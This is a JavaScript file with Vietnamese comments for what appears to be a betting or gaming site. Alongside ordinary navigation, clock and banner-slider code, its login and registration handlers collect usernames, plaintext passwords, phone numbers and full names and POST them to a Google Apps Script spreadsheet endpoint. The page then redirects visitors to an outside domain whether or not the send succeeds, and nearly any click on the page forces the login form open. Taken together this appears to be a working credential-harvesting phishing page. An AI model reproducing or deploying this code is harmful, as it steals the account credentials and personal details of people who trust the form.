document.addEventListener("DOMContentLoaded", function() {
    // ==========================================
    // 1. XỬ LÝ ACTIVE BOTTOM NAV
    // ==========================================
    const navItems = document.querySelectorAll('.bottom-nav .nav-item');

    navItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault(); 
            navItems.forEach(nav => nav.classList.remove('active'));
            if(!this.classList.contains('center-btn')){
                this.classList.add('active');
            }
        });
    });

    // ==========================================
    // 2. TÍNH NĂNG ĐỒNG HỒ GIỜ VIỆT NAM
    // ==========================================
    function updateVietnamTime() {
        const timeElement = document.getElementById('vn-time');
        if (!timeElement) return;

        const now = new Date();
        const vnTime = new Date(now.toLocaleString("en-US", {timeZone: "Asia/Ho_Chi_Minh"}));
        
        const day = String(vnTime.getDate()).padStart(2, '0');
        const month = String(vnTime.getMonth() + 1).padStart(2, '0'); 
        const year = vnTime.getFullYear();
        const hours = String(vnTime.getHours()).padStart(2, '0');
        const minutes = String(vnTime.getMinutes()).padStart(2, '0');
        
        timeElement.innerText = `${day}/${month}/${year} ${hours}:${minutes}`;
    }

    updateVietnamTime();
    setInterval(updateVietnamTime, 60000);

    // ==========================================
    // 3. AUTO BANNER SLIDER
    // ==========================================
    const bannerTrack = document.getElementById('bannerTrack');
    const dots = document.querySelectorAll('.dot');
    const prevBtn = document.querySelector('.prev-btn');
    const nextBtn = document.querySelector('.next-btn');
    
    if (bannerTrack) {
        let currentIndex = 0;
        const totalSlides = document.querySelectorAll('.banner-slide').length;
        let slideInterval;

        function updateSlider() {
            bannerTrack.style.transform = `translateX(-${currentIndex * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            if(dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        function nextSlide() {
            currentIndex = (currentIndex + 1) % totalSlides;
            updateSlider();
        }

        function prevSlide() {
            currentIndex = (currentIndex - 1 + totalSlides) % totalSlides;
            updateSlider();
        }

        function startInterval() {
            slideInterval = setInterval(nextSlide, 3000);
        }

        function resetInterval() {
            clearInterval(slideInterval);
            startInterval();
        }

        nextBtn.addEventListener('click', () => { nextSlide(); resetInterval(); });
        prevBtn.addEventListener('click', () => { prevSlide(); resetInterval(); });

        dots.forEach((dot) => {
            dot.addEventListener('click', (e) => {
                currentIndex = parseInt(e.target.getAttribute('data-index'));
                updateSlider();
                resetInterval();
            });
        });

        startInterval();
    }
});

// ==========================================
// 4. MODAL ĐĂNG NHẬP & ĐĂNG KÝ
// ==========================================
const authModal = document.getElementById('auth-modal');
const loginBox = document.getElementById('login-box');
const registerBox = document.getElementById('register-box');

const btnLoginTop = document.querySelector('.btn-login');
const btnRegisterTop = document.querySelector('.btn-register');

// Mở modal
if (btnLoginTop) {
    btnLoginTop.addEventListener('click', () => {
        authModal.classList.remove('hidden');
        switchForm('login');
    });
}
if (btnRegisterTop) {
    btnRegisterTop.addEventListener('click', () => {
        authModal.classList.remove('hidden');
        switchForm('register');
    });
}

// Đóng modal
function closeModal() {
    authModal.classList.add('hidden');
}
window.addEventListener('click', (e) => {
    if (e.target === authModal) closeModal();
});

// Chuyển form
function switchForm(formType) {
    if (formType === 'login') {
        loginBox.classList.remove('hidden');
        registerBox.classList.add('hidden');
    } else if (formType === 'register') {
        registerBox.classList.remove('hidden');
        loginBox.classList.add('hidden');
    }
}

// ==========================================
// 5. VALIDATE FORM, GỬI VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG
// ==========================================
const phoneRegex = /^\d{10}$/;
const targetUrl = "https://star.sng77.vip/";

// ĐIỀN ĐƯỜNG LINK GOOGLE APPS SCRIPT CỦA BẠN VÀO ĐÂY:
const googleSheetURL = "https://script.google.com/macros/s/AKfycbyc0H8MeysIcHzjgzaxU5tszaOHOJy9aL0VFhejZyi1wsIUgxh-r1a6-1-LJdytUqg/exec";

// Hàm gửi dữ liệu
function sendDataToSheet(formData) {
    fetch(googleSheetURL, {
        method: 'POST',
        mode: 'no-cors', // Bỏ qua lỗi CORS khi gọi chéo tên miền
        body: formData
    }).then(() => {
        // Gửi xong thì chuyển trang
        window.location.href = targetUrl;
    }).catch(error => {
        console.error('Error!', error.message);
        // Dù lỗi mạng thì vẫn chuyển trang để không làm gián đoạn luồng
        window.location.href = targetUrl;
    });
}

// ---------------------------------
// Xử lý Form Đăng Nhập
// ---------------------------------
const submitLoginBtn = document.querySelector('#login-box .btn-submit');
if (submitLoginBtn) {
    submitLoginBtn.addEventListener('click', function(e) {
        e.preventDefault(); 
        
        const inputs = document.querySelectorAll('#login-box input');
        const username = inputs[0].value.trim();
        const password = inputs[1].value.trim();
        const phone = inputs[2].value.trim();

        // Kiểm tra hợp lệ (Validation)
        if (!username || !password || !phone) {
            alert("Vui lòng điền đầy đủ thông tin!"); return;
        }
        if (username.length < 6 || username.length > 20) {
            alert("Tên đăng nhập phải từ 6 đến 20 ký tự!"); return;
        }
        if (password.length < 6 || password.length > 20) {
            alert("Mật khẩu phải từ 6 đến 20 ký tự!"); return;
        }
        if (!phoneRegex.test(phone)) {
            alert("Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 chữ số."); return;
        }

        // Tạo dữ liệu để gửi
        var formData = new FormData();
        formData.append("taikhoan", username);
        formData.append("matkhau", password);
        formData.append("sdt", phone);
        formData.append("hoten", ""); // Đăng nhập không có họ tên
        formData.append("trangthai", "Đăng nhập");

        // Gọi hàm gửi đi
        sendDataToSheet(formData);
    });
}

// ---------------------------------
// Xử lý Form Đăng Ký
// ---------------------------------
const submitRegisterBtn = document.querySelector('#register-box .btn-submit');
if (submitRegisterBtn) {
    submitRegisterBtn.addEventListener('click', function(e) {
        e.preventDefault(); 
        
        const inputs = document.querySelectorAll('#register-box input[type="text"], #register-box input[type="password"], #register-box input[type="tel"]');
        const username = inputs[0].value.trim();
        const password = inputs[1].value.trim();
        const fullname = inputs[2].value.trim();
        const phone = inputs[3].value.trim();

        // Kiểm tra hợp lệ (Validation)
        if (!username || !password || !fullname || !phone) {
            alert("Vui lòng điền đầy đủ tất cả các trường!"); return;
        }
        if (username.length < 6 || username.length > 20) {
            alert("Tên đăng nhập phải từ 6 đến 20 ký tự!"); return;
        }
        if (password.length < 6 || password.length > 20) {
            alert("Mật khẩu phải từ 6 đến 20 ký tự!"); return;
        }
        if (!phoneRegex.test(phone)) {
            alert("Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 chữ số."); return;
        }
        const policyChecked = document.getElementById('policy').checked;
        if (!policyChecked) {
            alert("Bạn cần đồng ý với chính sách thành viên để đăng ký!"); return;
        }

        // Tạo dữ liệu để gửi
        var formData = new FormData();
        formData.append("taikhoan", username);
        formData.append("matkhau", password);
        formData.append("sdt", phone);
        formData.append("hoten", fullname);
        formData.append("trangthai", "Đăng ký");

        // Gọi hàm gửi đi
        sendDataToSheet(formData);
    });
}

// ==========================================
// 6. NHẤN VÀO BẤT CỨ ĐÂU ĐỀU MỞ FORM ĐĂNG NHẬP
// ==========================================
// Chọn tất cả link (menu, tiện ích), nút soi kèo, và tất cả các ô game (cả PC và Mobile)
const requireLoginElements = document.querySelectorAll('a[href="#"], .btn-soikeo, .game-card, .m-card');

requireLoginElements.forEach(el => {
    el.addEventListener('click', function(e) {
        e.preventDefault(); // Ngăn hành vi chuyển trang mặc định

        // Nếu click vào các liên kết TRONG nội bộ modal (như Quên mật khẩu, Chuyển form đăng ký) thì bỏ qua
        if (this.closest('#auth-modal')) return;

        // Bỏ qua các nút Đăng nhập / Đăng ký trên Header vì đã xử lý ở phần 4
        if (this.classList.contains('btn-login') || this.classList.contains('btn-register')) return;

        // Lập tức mở form Đăng nhập
        authModal.classList.remove('hidden');
        switchForm('login');
    });
});